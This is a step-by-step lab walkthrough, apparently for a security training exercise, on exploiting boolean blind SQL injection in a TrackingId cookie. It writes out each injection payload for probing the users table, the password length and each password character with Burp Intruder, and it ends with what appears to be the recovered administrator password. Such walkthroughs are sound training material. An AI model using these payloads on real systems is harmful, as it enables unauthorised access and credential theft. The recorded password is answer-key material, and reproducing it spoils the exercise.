### Exploiting blind SQL injection by triggering conditional responses

1-  Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is TrackingId=xyz.

2 - Modify the TrackingId cookie, changing it to:
```TrackingId=xyz' AND '1'='1```

Verify that the "Welcome back" message appears in the response.

3 - Now change it to:
```TrackingId=xyz' AND '1'='2```

Verify that the "Welcome back" message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.

4 - Now change it to:
```TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a```

Verify that the condition is true, confirming that there is a table called users.

5 - Now change it to:

```TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a``` 

Verify that the condition is true, confirming that there is a user called administrator.

6 - The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:

```TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a```

 This condition should be true, confirming that the password is greater than 1 character in length.

7 - Send a series of follow-up values to test different password lengths. Send:

```TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a```

Then send:
```TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a```

And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the "Welcome back" message disappears), you have determined the length of the password, which is in fact 20 characters long.

8 - After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.

9 - In the Positions tab of Burp Intruder, change the value of the cookie to:
```TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a```

 This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

10 - Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):

```TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§```

11 - To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under Payload settings add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.

12 - To be able to tell when the correct character was submitted, you'll need to grep each response for the expression "Welcome back". To do this, go to the Settings tab, and the "Grep - Match" section. Clear any existing entries in the list, and then add the value "Welcome back". 

13 -  Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.

14 - Review the attack results to find the value of the character at the first position. You should see a column in the results called "Welcome back". One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.

15 - Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:

```TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a```

16 - Launch the modified attack, review the results, and note the character at the second offset.

17 - Continue this process testing offset 3, 4, and so on, until you have the whole password.
18 - In the browser, click "My account" to open the login page. Use the password to log in as the administrator user. 

1234567891011121314151617181920
0boibzaol3g70po1l0t8
